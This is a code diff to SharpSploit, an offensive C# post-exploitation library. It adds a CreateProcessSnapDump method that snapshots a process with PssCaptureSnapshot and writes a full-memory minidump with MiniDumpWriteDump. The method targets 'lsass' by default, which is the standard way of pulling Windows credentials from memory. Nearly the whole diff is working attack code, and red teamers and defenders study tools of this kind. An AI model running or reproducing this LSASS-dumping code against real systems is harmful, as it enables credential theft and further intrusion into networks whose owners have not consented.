@@ -269,6 +269,143 @@ namespace SharpSploit.Enumeration
         }
 
         /// <summary>
+        /// Auxiliary function for MiniDrumpWriteDump callbacks.
+        /// </summary>
+        /// <param name="CallbackParam"></param>
+        /// <param name="CallbackInput"></param>
+        /// <param name="CallbackOutput"></param>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) & Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static bool MiniDumpWriteDumpCallback(IntPtr CallbackParam, ref Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INPUT CallbackInput, ref Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_OUTPUT CallbackOutput)
+        {
+        switch (CallbackInput.CallbackType)
+        {
+            case Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback: // IsProcessSnapshotCallback
+                CallbackOutput.Status = 1;
+                break;
+        }
+        return true;
+        }
+
+        /// <summary>
+        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
+        /// Minimum supported Windows: Windows 8.1+ and Windows Server 2012+
+        /// </summary>
+        /// <param name="processId">Process ID of the process to generate a minidump for.</param>
+        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
+        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) & Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static void CreateProcessSnapDump(int processId, string outputPath = "", string outputFileName = "")
+        {
+            CreateProcessSnapDump(Process.GetProcessById(processId), outputPath, outputFileName);
+        }
+
+        /// <summary>
+        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
+        /// Minimum supported Windows: Windows 8.1+ and Windows Server 2012+
+        /// </summary>
+        /// <param name="processName">Name of the process to generate a minidump for.</param>
+        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
+        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) & Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static void CreateProcessSnapDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
+        {
+            if (processName.EndsWith(".exe"))
+            {
+                processName = processName.Substring(0, processName.Length - 4);
+            }
+            Process[] process_list = Process.GetProcessesByName(processName);
+            if (process_list.Length > 0)
+            {
+                CreateProcessSnapDump(process_list[0], outputPath, outputFileName);
+            }
+        }
+
+        /// <summary>
+        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
+        /// Minimum supported Windows versions: Windows 8.1+ and Windows Server 2012+
+        /// </summary>
+        /// <param name="process">Process to generate a minidump for.</param>
+        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
+        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) & Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static void CreateProcessSnapDump(Process process, string outputPath = "", string outputFileName = "")
+        {
+            if (outputPath == "" || outputPath == null)
+            {
+                outputPath = GetCurrentDirectory();
+            }
+            if (outputFileName == "" || outputFileName == null)
+            {
+                outputFileName = process.ProcessName + "_" + process.Id + ".dmp";
+            }
+            
+            string fullPath = Path.Combine(outputPath, outputFileName);
+            FileStream fileStream = new FileStream(fullPath, FileMode.Create);
+
+            IntPtr snapshotHandle;
+
+            var flags = Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION;
+
+            Int32 hr = PInvoke.Win32.Kernel32.PssCaptureSnapshot(process.Handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshotHandle);
+
+            if (hr != 0)
+            {
+                Console.WriteLine($"PssCaptureSnapshot failed. ({hr})");
+            }
+
+            Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION();
+            CallbackInfo.CallbackRoutine = Host.MiniDumpWriteDumpCallback;
+            CallbackInfo.CallbackParam = IntPtr.Zero;
+
+            IntPtr pCallbackInfo = Marshal.AllocHGlobal(Marshal.SizeOf(CallbackInfo));
+            Marshal.StructureToPtr(CallbackInfo, pCallbackInfo, false);
+
+            bool success = false;
+            try
+            {
+                success = PInvoke.Win32.Dbghelp.MiniDumpWriteDump(snapshotHandle, (uint)process.Id, fileStream.SafeFileHandle, Execution.Win32.Dbghelp.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, pCallbackInfo);
+            }
+            catch (System.ComponentModel.Win32Exception e)
+            {
+                Console.Error.WriteLine(e.Message);
+            }
+
+            fileStream.Close();
+            if (!success)
+            {
+                File.Delete(fullPath);
+            }
+        }
+
+        /// <summary>
         /// Gets the hostname of the system.
         /// </summary>
         /// <returns>Hostname of the system.</returns>
